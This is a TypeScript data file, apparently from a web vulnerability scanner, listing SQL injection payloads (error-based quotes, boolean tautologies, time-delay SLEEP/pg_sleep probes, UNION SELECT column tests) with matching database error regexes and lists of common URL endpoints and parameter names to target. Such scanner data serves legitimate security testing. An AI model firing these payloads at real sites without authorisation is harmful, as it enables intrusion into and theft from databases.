export interface SqliPayload {
  name: string;
  technique:
    | "error-based"
    | "boolean-based"
    | "time-based"
    | "union-based"
    | "blind";
  payload: string;
  errorPatterns?: RegExp[];
  trueCondition?: string;
  falseCondition?: string;
  timeDelay?: number;
}

export const SQLI_PAYLOADS: SqliPayload[] = [
  // Error-based
  {
    name: "Single Quote",
    technique: "error-based",
    payload: "'",
    errorPatterns: [
      /SQL syntax.*MySQL/i,
      /Warning.*mysql_.*:/i,
      /MySqlException/i,
      /Unclosed quotation mark/i,
      /quoted string not properly terminated/i,
    ],
  },
  {
    name: "Double Quote",
    technique: "error-based",
    payload: '"',
    errorPatterns: [
      /Unclosed quotation mark/i,
      /quoted string not properly terminated/i,
      /Ora-00933/i,
    ],
  },
  {
    name: "SQL Comment",
    technique: "error-based",
    payload: "--",
    errorPatterns: [/SQL syntax/i, /MySQLSyntaxErrorException/i],
  },
  {
    name: "Stacked Query Test",
    technique: "error-based",
    payload: ";",
    errorPatterns: [/Warning.*mysql/i, /SQL syntax/i],
  },
  // Boolean-based
  {
    name: "Boolean True (1=1)",
    technique: "boolean-based",
    payload: "' OR '1'='1",
    trueCondition: "' OR '1'='1",
    falseCondition: "' AND '1'='2",
  },
  {
    name: "Boolean True (numeric)",
    technique: "boolean-based",
    payload: " OR 1=1--",
    trueCondition: " OR 1=1--",
    falseCondition: " AND 1=2--",
  },
  {
    name: "Boolean True (parenthesis)",
    technique: "boolean-based",
    payload: "') OR ('1'='1",
    trueCondition: "') OR ('1'='1",
    falseCondition: "') AND ('1'='2",
  },
  // Time-based
  {
    name: "MySQL Time-Based",
    technique: "time-based",
    payload: "' OR SLEEP(5)--",
    timeDelay: 5,
    errorPatterns: [],
  },
  {
    name: "MySQL Time-Based (BENCHMARK)",
    technique: "time-based",
    payload: "' OR BENCHMARK(5000000, MD5('test'))--",
    timeDelay: 5,
    errorPatterns: [],
  },
  {
    name: "PostgreSQL Time-Based",
    technique: "time-based",
    payload: "' OR pg_sleep(5)--",
    timeDelay: 5,
    errorPatterns: [],
  },
  {
    name: "SQLite Time-Based",
    technique: "time-based",
    payload: "' OR LIKE('abcdefg', UPPER(HEX(RANDOMBLOB(50000000/2))))--",
    timeDelay: 5,
    errorPatterns: [],
  },
  // Union-based
  {
    name: "Union Select (1 col)",
    technique: "union-based",
    payload: "' UNION SELECT NULL--",
    errorPatterns: [],
  },
  {
    name: "Union Select (4 cols)",
    technique: "union-based",
    payload: "' UNION SELECT NULL,NULL,NULL,NULL--",
    errorPatterns: [],
  },
  {
    name: "Union Select (10 cols)",
    technique: "union-based",
    payload:
      "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    errorPatterns: [],
  },
  // Blind
  {
    name: "Blind TRUE",
    technique: "blind",
    payload: "' AND 1=1--",
    trueCondition: "' AND 1=1--",
    falseCondition: "' AND 1=2--",
  },
];

export const SQLI_ENDPOINTS = [
  "/?id=1",
  "/?page=1",
  "/?cat=1",
  "/?product=1",
  "/?article=1",
  "/?post=1",
  "/?news=1",
  "/?item=1",
  "/?user=1",
  "/?uid=1",
  "/?id=1&page=1",
];

export const SQLI_PARAMS = [
  "id",
  "page",
  "cat",
  "product",
  "article",
  "post",
  "news",
  "item",
  "user",
  "uid",
  "pid",
  "sid",
  "bid",
  "gid",
  "order",
  "sort",
  "search",
  "q",
  "query",
  "s",
  "term",
  "lang",
];
